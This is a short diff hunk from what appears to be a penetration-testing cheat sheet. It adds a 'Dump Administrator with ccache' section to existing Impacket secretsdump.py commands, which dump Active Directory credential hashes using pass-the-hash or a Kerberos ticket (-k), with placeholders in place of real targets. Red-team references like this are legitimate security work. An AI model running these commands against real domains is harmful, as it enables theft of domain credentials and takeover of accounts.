@@ -20,3 +20,9 @@ secretsdump.py <domain>/<user>@<ip> -hashes :<nthash>
 ```
 secretsdump.py <domain>/<user>@<ip> -hashes :<nthash> -just-dc-user <target_user|Administrator>
 ```
+
+## Dump Administrator with ccache
+```
+secretsdump.py <FQDN.DOMAIN.LOCAL> -k 
+```
+
